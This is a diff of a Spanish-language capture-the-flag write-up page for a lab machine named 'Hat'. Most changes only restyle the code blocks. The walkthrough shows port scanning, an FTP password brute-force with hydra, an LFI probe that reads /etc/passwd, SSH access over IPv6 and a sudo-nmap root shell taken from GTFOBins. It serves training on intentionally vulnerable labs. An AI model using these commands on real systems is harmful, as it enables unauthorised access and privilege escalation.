@@ -38,7 +38,7 @@
             <img class="img_nyx" src="../../assets/img/nyx_hat/logo.png" alt="logo">
             <h3>Escaneo de puertos</h3>
             <pre class="pre__nyx">
-<code class="code language-js">❯ nmap -p- -T5 -v -n 192.168.1.24
+<code class="code language-txt">❯ nmap -p- -T5 -v -n 192.168.1.24
 
 PORT      STATE    SERVICE
 22/tcp    filtered ssh
@@ -47,7 +47,7 @@ PORT      STATE    SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre__nyx">
-<code class="language-js">❯ nmap -sVC -v -p 22,80,65535 192.168.1.24
+<code class="code language-txt">❯ nmap -sVC -v -p 22,80,65535 192.168.1.24
 
 PORT      STATE    SERVICE VERSION
 22/tcp    filtered ssh
@@ -69,12 +69,12 @@ PORT      STATE    SERVICE VERSION
 
             <h3>SSH</h3>
 <pre class="pre__nyx">
-<code class="language-js">22/tcp    filtered
+<code class="code language-txt">22/tcp    filtered
 </code><i class="cursiva">Más adelante explicaré porque está filtrado.</i></pre>
 
             <h3>HTTP</h3>                
 <pre class="pre__nyx">
-<code class="language-js">❯ whatweb -v 192.168.1.24
+<code class="code language-txt">❯ whatweb -v 192.168.1.24
 
 Status    : 200 OK
 Title     : Apache2 Debian Default Page: It works
@@ -84,7 +84,7 @@ Summary   : Apache[2.4.38], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)]
 </code></pre>
 
             <p>Si intento conectarme al servidor ftp con el usuario anonymous me dice que no tengo acceso con dicho usuario.</p>
-<pre class="pre__nyx"><code class="language-js">❯ ftp anonymous@192.168.1.24 65535
+<pre class="pre__nyx"><code class="code language-txt">❯ ftp anonymous@192.168.1.24 65535
 Connected to 192.168.1.24.
 220 pyftpdlib 1.5.4 ready.
 331 Username ok, send password.
@@ -95,7 +95,7 @@ ftp: Login failed
 
             <p>Empiezo enumerando directorios con<code class="code_negrita">&nbsp;WFUZZ&nbsp;</code>y encuentro dos directorios que me llaman la atención.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ wfuzz -c -t 200 --hc=404 --hw=933 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.24/FUZZ
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=933 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.24/FUZZ
     
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
@@ -108,7 +108,7 @@ ID           Response   Lines    Word       Chars       Payload
             
             <p>Búsqueda de extensiones<code class="code_negrita">&nbsp;log&nbsp;</code>en el directorio<code class="code_negrita">&nbsp;logs&nbsp;</code>.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,log http://192.168.1.24/logs/FUZZ.FUZ2Z
+<code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,log http://192.168.1.24/logs/FUZZ.FUZ2Z
     
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
@@ -117,7 +117,7 @@ ID           Response   Lines    Word       Chars       Payload
 000117684:   200        25 L     190 W      1760 Ch     "vsftpd - log"                                                                                                                                  
 </code></pre>
             <p>Con curl miro el contendio del archivo<code class="code_negrita">&nbsp;vsftpd.log&nbsp;</code>y observo que el usuario<code class="code_negrita">&nbsp;admin_ftp&nbsp;</code>se ha logueado correctamente al servidor ftp y luego se ha desconectado.</p>
-<pre class="pre__nyx"><code class="language-js">❯ curl -s http://192.168.1.24/logs/vsftpd.log
+<pre class="pre__nyx"><code class="code language-txt">❯ curl -s http://192.168.1.24/logs/vsftpd.log
 
 [I 2021-09-28 18:43:57] >>> starting FTP server on 0.0.0.0:21, pid=475 <<<
 [I 2021-09-28 18:43:57] concurrency model: async
@@ -146,18 +146,18 @@ ID           Response   Lines    Word       Chars       Payload
 </code></pre>
 
             <p>Realizo un ataque de fuerza bruta al servidor ftp con el usuario<code class="code_negrita">&nbsp;admin_ftp&nbsp;</code>y consigo su contraseña.</p>
-<pre class="pre__nyx"><code class="language-js">hydra -t 50 -l admin_ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.24 -s 65535 -V -f -I
+<pre class="pre__nyx"><code class="code language-txt">hydra -t 50 -l admin_ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.24 -s 65535 -V -f -I
 [65535][ftp] host: 192.168.1.24   login: admin_ftp   password: c****y
 </code></pre>
 
-            <p>Me conecto al servidor FTP y veo una carpeta con el nombre<code class="code_negrita">&nbsp;share</code>.</p>
-<pre class="pre__nyx"><code class="language-js">ftp> ls
+            <p>Me conecto al servidor FTP y veo una carpeta con el nombre<code class="code_negrita">&nbsp;share&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">ftp> ls
 229 Entering extended passive mode (|||38957|).
 125 Data connection already open. Transfer starting.
 drwxrwxrwx   2 cromiphi cromiphi     4096 Sep 28  2021 share
 </code></pre>
             <p>Dentro de share encuentro los siguientes archivos y me los descargo.</p>
-<pre class="pre__nyx"><code class="language-js">ftp> cd share
+<pre class="pre__nyx"><code class="code language-txt">ftp> cd share
 250 "/share" is the current directory.
 ftp> ls
 229 Entering extended passive mode (|||49285|).
@@ -167,7 +167,7 @@ ftp> ls
 </code></pre>
 
             <p>Archivo note.</p>
-<pre class="pre__nyx"><code class="language-txt">Hi,
+<pre class="pre__nyx"><code class="code language-txt">Hi,
 We have successfully secured some of our most critical protocols ... no more worrying!
 Sysadmin
 </code></pre>
@@ -175,8 +175,8 @@ Sysadmin
             <p>Uso<code class="code_negrita">&nbsp;RSACrack&nbsp;</code>para conseguir el passhprase del archivo id_rsa.</p>
             <img class="img_m" src="../../assets/img/nyx_hat/rsaCrack.png" alt="rsaCrack">
 
-            <p>Antes de conectarme por ssh me falta un directorio por enumerar, asi que hago una búsqueda de extensiones<code class="code_negrita">&nbsp;php&nbsp;</code>en el directorio<code class="code_negrita">&nbsp;php-scripts</code>.</p>
-<pre class="pre__nyx"><code class="language-js">❯ wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php http://192.168.1.24/php-scripts/FUZZ.FUZ2Z
+            <p>Antes de conectarme por ssh me falta un directorio por enumerar, asi que hago una búsqueda de extensiones<code class="code_negrita">&nbsp;php&nbsp;</code>en el directorio<code class="code_negrita">&nbsp;php-scripts&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php http://192.168.1.24/php-scripts/FUZZ.FUZ2Z
     
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
@@ -186,7 +186,7 @@ ID           Response   Lines    Word       Chars       Payload
 </code></pre>
 
             <p>El archivo<code class="code_negrita">&nbsp;file.php&nbsp;</code>es vulnerable a LFI.</p>
-<pre class="pre__nyx"><code class="language-js">❯ wfuzz -c -t 200 --hc=404 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://192.168.1.24/php-scripts/file.php?FUZZ=/etc/passwd"
+<pre class="pre__nyx"><code class="code language-txt">❯ wfuzz -c -t 200 --hc=404 --hh=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://192.168.1.24/php-scripts/file.php?FUZZ=/etc/passwd"
   
 =====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
@@ -200,15 +200,15 @@ ID           Response   Lines    Word       Chars       Payload
 
             
 
-            <p>Si intento conectarme por SSH no conseguiré conectarme porque el puerto está filtrado, pero está filtrado para<code class="code_negrita">&nbsp;IPv4&nbsp;</code>pero no para<code class="code_negrita">&nbsp;IPv6</code>, para ver que<code class="code_negrita">&nbsp;IPv6&nbsp;</code>tiene la máquina objetivo usaré<code class="code_negrita">&nbsp;ping6</code>.</p>
-<pre class="pre__nyx"><code class="language-js">❯ ping6 -c2 -n -I eth0 ff02::1
+            <p>Si intento conectarme por SSH no conseguiré conectarme porque el puerto está filtrado, pero está filtrado para<code class="code_negrita">&nbsp;IPv4&nbsp;</code>pero no para<code class="code_negrita">&nbsp;IPv6&nbsp;</code>, para ver que<code class="code_negrita">&nbsp;IPv6&nbsp;</code>tiene la máquina objetivo usaré<code class="code_negrita">&nbsp;ping6&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">❯ ping6 -c2 -n -I eth0 ff02::1
 ping6: Warning: source address might be selected on device other than: eth0
 PING ff02::1(ff02::1) from :: eth0: 56 data bytes
 64 bytes from fe80::a00:27ff:fe53:c789%eth0: icmp_seq=1 ttl=64 time=0.797 ms
 </code></pre>
 
             <p>Ahora si me puedo conectar al sistema por SSH.</p>
-<pre class="pre__nyx"><code class="language-js">❯ ssh -6 -i id_rsa cromiphi@fe80::a00:27ff:fe53:c789%eth0
+<pre class="pre__nyx"><code class="code language-txt">❯ ssh -6 -i id_rsa cromiphi@fe80::a00:27ff:fe53:c789%eth0
 Enter passphrase for key 'id_rsa': 
 Linux Hat 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
 cromiphi@Hat:~$ id
@@ -216,7 +216,7 @@ uid=1000(cromiphi) gid=1000(cromiphi) grupos=1000(cromiphi),24(cdrom),25(floppy)
 </code></pre>
 
             <p>Enumero permisos con sudo.</p>
-<pre class="pre__nyx"><code class="language-js">cromiphi@Hat:~$ sudo -l
+<pre class="pre__nyx"><code class="code language-txt">cromiphi@Hat:~$ sudo -l
 Matching Defaults entries for cromiphi on Hat:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
     
@@ -224,12 +224,12 @@ User cromiphi may run the following commands on Hat:
     (root) NOPASSWD: /usr/bin/nmap
 </code></pre>
 
-            <p>Para obtener el root es usado este recurso online de<code class="code_negrita">&nbsp;GTFOBins</code>.</p>
-<pre class="pre__nyx"><code class="language-txt">https://gtfobins.github.io/gtfobins/nmap/#sudo
+            <p>Para obtener el root es usado este recurso online de<code class="code_negrita">&nbsp;GTFOBins&nbsp;</code>.</p>
+<pre class="pre__nyx"><code class="code language-txt">https://gtfobins.github.io/gtfobins/nmap/#sudo
 </code></pre>
 
             <p>Obtengo el root realizando estos pasos.</p>
-<pre class="pre__nyx"><code class="language-js">cromiphi@Hat:~$ TF=$(mktemp)
+<pre class="pre__nyx"><code class="code language-txt">cromiphi@Hat:~$ TF=$(mktemp)
 cromiphi@Hat:~$ echo 'os.execute("/bin/bash")' > $TF
 cromiphi@Hat:~$ sudo /usr/bin/nmap --script=$TF
 Starting Nmap 7.70 ( https://nmap.org ) at 2023-04-24 21:26 CEST
@@ -238,7 +238,7 @@ root@Hat:/home/cromiphi# uid=0(root) gid=0(root) grupos=0(root)
 </code></pre>
 
 
-            <p>Y con esto ya tenemos resuelta la máquina Hat del sr d4t4s3c, Saludos!</p>
+            <p>Y con esto ya tenemos resuelta la máquina Hat del sr d4t4s3c</p>
 
     </main>
         <footer class="footer">
